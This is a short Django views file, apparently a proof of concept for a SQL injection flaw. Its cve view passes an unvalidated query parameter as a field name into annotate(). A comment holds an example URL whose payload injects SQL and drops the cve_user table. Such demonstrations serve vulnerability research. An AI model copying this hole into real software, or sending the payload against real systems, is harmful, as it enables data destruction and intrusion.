from django.http import HttpResponse
from django.db.models import Count
from .models import User

## http://127.0.0.1:8000/cve?field=count" from cve_user group by cve_user.id;DROP TABLE cve_user;--
def cve(request):
    loadexampledata(request)
    field = request.GET.get('field', 'user_name')
    user_amount = User.objects.annotate(**{field:Count("user_name")})
    return HttpResponse(user_amount)


def loadexampledata(request):
    u=User(user_name="Admin")
    u.save()
    u=User(user_name="Moderator")
    u.save()
    u=User(user_name="Helpdesk")
    u.save()
